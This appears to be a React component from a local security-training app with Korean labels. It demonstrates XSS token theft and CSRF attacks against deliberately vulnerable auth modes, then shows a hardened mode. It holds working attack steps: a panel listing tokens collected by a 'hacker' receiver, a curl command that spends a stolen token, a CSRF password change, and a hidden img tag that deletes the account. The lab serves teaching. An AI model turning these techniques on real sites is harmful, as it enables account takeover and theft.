'use client';

import { useState, useEffect } from 'react';
import { AuthMode } from '@/store/authStore';

interface StolenToken {
  token: string;
  preview: string;
  timestamp: string;
  ip: string;
}

interface Props {
  mode: AuthMode;
}

export function AttackPanel({ mode }: Props) {
  switch (mode) {
    case 'v1': return <V1Panel />;
    case 'v2': return <V2Panel />;
    case 'v3': return <V3Panel />;
    case 'v4': return <V4Panel />;
  }
}

// ── V1: XSS 공격 ────────────────────────────────────────────────
function V1Panel() {
  const [tokens, setTokens] = useState<StolenToken[]>([]);
  const [loading, setLoading] = useState(false);

  const fetchTokens = async () => {
    setLoading(true);
    try {
      const res = await fetch('http://localhost:4999/tokens');
      const data = await res.json();
      setTokens(data.tokens ?? []);
    } catch {
      // receiver not running
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTokens();
    const id = setInterval(fetchTokens, 3000);
    return () => clearInterval(id);
  }, []);

  return (
    <div className="space-y-4">
      <div className="rounded-lg border border-red-300 bg-red-50 p-4">
        <h3 className="font-semibold text-red-800">V1 XSS 공격 시나리오</h3>
        <ol className="mt-2 space-y-1 text-sm text-red-700 list-decimal list-inside">
          <li>공격 수신 서버 실행: <code className="bg-red-100 px-1 rounded">node hacker/xss-receiver.js</code></li>
          <li>이 탭에서 V1 모드로 로그인 (victim@test.com / victim1234)</li>
          <li>
            <a href="/posts" className="underline font-medium">게시글 페이지</a>로 이동 →
            XSS 페이로드 자동 실행
          </li>
          <li>아래 "탈취된 토큰" 목록에서 AT 확인</li>
          <li>탈취한 AT로 포인트 이체 직접 실행</li>
        </ol>
      </div>

      <div className="rounded-lg border border-gray-200 bg-white p-4">
        <div className="flex items-center justify-between mb-3">
          <h4 className="text-sm font-semibold text-gray-700">
            탈취된 토큰 ({tokens.length}개)
          </h4>
          <button
            onClick={fetchTokens}
            disabled={loading}
            className="text-xs text-blue-600 hover:underline disabled:opacity-50"
          >
            {loading ? '갱신 중...' : '새로고침'}
          </button>
        </div>

        {tokens.length === 0 ? (
          <p className="text-xs text-gray-400">
            아직 수집된 토큰 없음. XSS receiver 실행 후 게시글 페이지를 방문하세요.
          </p>
        ) : (
          <div className="space-y-2">
            {tokens.map((t, i) => (
              <div key={i} className="rounded bg-gray-900 p-3 font-mono text-xs text-green-400">
                <p className="text-gray-400"># {t.timestamp} | {t.ip}</p>
                <p className="break-all mt-1">{t.preview}</p>
                <button
                  onClick={() => navigator.clipboard.writeText(t.token)}
                  className="mt-2 text-yellow-400 hover:text-yellow-300"
                >
                  [복사]
                </button>
              </div>
            ))}
          </div>
        )}
      </div>

      <div className="rounded border border-gray-200 bg-gray-50 p-3 text-xs text-gray-500">
        <p className="font-medium">수동 공격 (탈취 토큰 사용):</p>
        <pre className="mt-1 overflow-x-auto whitespace-pre">{`curl -X POST http://localhost:4001/api/points/transfer \\
  -H "Authorization: Bearer <탈취한_AT>" \\
  -H "Content-Type: application/json" \\
  -d '{"toEmail":"hacker@test.com","amount":1000000}'`}</pre>
      </div>
    </div>
  );
}

// ── V2: CSRF 공격 ────────────────────────────────────────────────
function V2Panel() {
  const [result, setResult] = useState<string | null>(null);

  const runAttack = async () => {
    setResult('실행 중...');
    try {
      const res = await fetch('http://localhost:4001/api/user/update-password', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ newPassword: 'hacked1234' }),
      });
      if (res.ok) {
        setResult('✅ 공격 성공! 비밀번호가 hacked1234로 변경되었습니다.');
      } else {
        const data = await res.json().catch(() => ({}));
        setResult(`❌ 실패 (${res.status}): ${data.message ?? '세션 없음. V2 모드로 로그인 후 재시도.'}`);
      }
    } catch (e: unknown) {
      setResult(`오류: ${(e as Error).message}`);
    }
  };

  return (
    <div className="space-y-4">
      <div className="rounded-lg border border-orange-300 bg-orange-50 p-4">
        <h3 className="font-semibold text-orange-800">V2 CSRF 공격 시나리오</h3>
        <ol className="mt-2 space-y-1 text-sm text-orange-700 list-decimal list-inside">
          <li>V2 모드로 로그인 (세션 쿠키 발급)</li>
          <li>아래 버튼 클릭 = 외부 사이트에서 요청 시뮬레이션</li>
          <li>세션 쿠키가 자동 전송되어 비밀번호 변경 성공</li>
          <li>V2 로그아웃 후 변경된 비밀번호로 재로그인 시도</li>
        </ol>
      </div>

      <div className="rounded-lg border border-gray-200 bg-white p-4">
        <p className="text-sm text-gray-600 mb-3">
          CSRF 토큰 없이 세션 쿠키만으로 민감한 작업이 실행됩니다.
        </p>
        <button
          onClick={runAttack}
          className="rounded bg-orange-600 px-4 py-2 text-sm text-white hover:bg-orange-700"
        >
          CSRF 공격 실행 (비밀번호 변경)
        </button>
        {result && (
          <p className={`mt-3 text-sm font-medium ${result.startsWith('✅') ? 'text-green-600' : 'text-red-600'}`}>
            {result}
          </p>
        )}
      </div>

      <div className="text-xs text-gray-500">
        <p>외부 공격 페이지: <a href="http://localhost:5000/csrf-v2" target="_blank"
          className="text-blue-600 underline">http://localhost:5000/csrf-v2</a>
          {' '}(hacker/server.js 실행 필요)</p>
      </div>
    </div>
  );
}

// ── V3: GET CSRF 공격 ────────────────────────────────────────────
function V3Panel() {
  const [triggered, setTriggered] = useState(false);

  return (
    <div className="space-y-4">
      <div className="rounded-lg border border-yellow-300 bg-yellow-50 p-4">
        <h3 className="font-semibold text-yellow-800">V3 GET CSRF 공격 시나리오</h3>
        <ol className="mt-2 space-y-1 text-sm text-yellow-700 list-decimal list-inside">
          <li>V3 모드로 로그인 (AT 쿠키 발급, SameSite=Lax)</li>
          <li>아래 버튼 클릭 → img 태그 삽입 = GET /api/user/withdraw 자동 전송</li>
          <li>SameSite=Lax이므로 GET 요청에 AT 쿠키 자동 첨부</li>
          <li>계정 탈퇴 처리 → 이후 로그인 불가</li>
        </ol>
      </div>

      <div className="rounded-lg border border-gray-200 bg-white p-4">
        <p className="text-sm text-gray-600 mb-3">
          GET 메서드 + SameSite=Lax = img 태그 한 줄로 계정 탈퇴 가능
        </p>
        <button
          onClick={() => setTriggered(true)}
          disabled={triggered}
          className="rounded bg-yellow-600 px-4 py-2 text-sm text-white hover:bg-yellow-700 disabled:opacity-50"
        >
          GET CSRF 실행 (img 태그 삽입)
        </button>

        {triggered && (
          <>
            {/* ❌ img 태그가 GET 요청을 트리거 */}
            <img
              src="http://localhost:4001/api/user/withdraw"
              className="hidden"
              alt=""
              onLoad={() => {}}
              onError={() => {}}
            />
            <p className="mt-3 text-sm text-yellow-700">
              GET 요청 전송됨. V3 모드로 다시 로그인 시도하면 탈퇴된 계정 오류를 확인할 수 있습니다.
            </p>
          </>
        )}
      </div>

      <div className="text-xs text-gray-500">
        <p>외부 공격 페이지: <a href="http://localhost:5000/csrf-v3" target="_blank"
          className="text-blue-600 underline">http://localhost:5000/csrf-v3</a>
          {' '}(hacker/server.js 실행 필요)</p>
      </div>
    </div>
  );
}

// ── V4: 방어 ────────────────────────────────────────────────────
function V4Panel() {
  const [result, setResult] = useState<string | null>(null);

  const tryAttack = async () => {
    setResult('공격 시도 중...');
    try {
      // CSRF 시도: 쿠키만으로 인증되는 엔드포인트 없음
      const res = await fetch('http://localhost:4001/api/user/update-password', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ newPassword: 'hacked1234' }),
      });
      const data = await res.json().catch(() => ({}));
      setResult(`서버 응답 (${res.status}): ${data.message ?? JSON.stringify(data)}`);
    } catch (e: unknown) {
      setResult(`오류: ${(e as Error).message}`);
    }
  };

  return (
    <div className="space-y-4">
      <div className="rounded-lg border border-green-300 bg-green-50 p-4">
        <h3 className="font-semibold text-green-800">V4 — 모든 공격 차단</h3>
        <div className="mt-2 space-y-2 text-sm text-green-700">
          <div className="flex items-start gap-2">
            <span>✅</span>
            <span><strong>XSS 불가:</strong> AT가 Zustand 메모리에만 존재. localStorage/쿠키 없음.</span>
          </div>
          <div className="flex items-start gap-2">
            <span>✅</span>
            <span><strong>CSRF 불가:</strong> 모든 인증 API가 Authorization Bearer 헤더 요구.</span>
          </div>
          <div className="flex items-start gap-2">
            <span>✅</span>
            <span><strong>RT 보호:</strong> SameSite=Strict 쿠키 → 외부 요청 시 쿠키 미전송.</span>
          </div>
          <div className="flex items-start gap-2">
            <span>✅</span>
            <span><strong>RT Rotation:</strong> 매 refresh마다 새 RT 발급 → 탈취 후에도 재사용 불가.</span>
          </div>
        </div>
      </div>

      <div className="rounded-lg border border-gray-200 bg-white p-4">
        <p className="text-sm text-gray-600 mb-3">
          CSRF 공격을 시도해도 세션/쿠키가 없어 인증 자체가 불가합니다.
        </p>
        <button
          onClick={tryAttack}
          className="rounded bg-gray-500 px-4 py-2 text-sm text-white hover:bg-gray-600"
        >
          CSRF 공격 시도 (실패 확인용)
        </button>
        {result && (
          <p className="mt-3 text-sm text-red-600">{result}</p>
        )}
      </div>
    </div>
  );
}
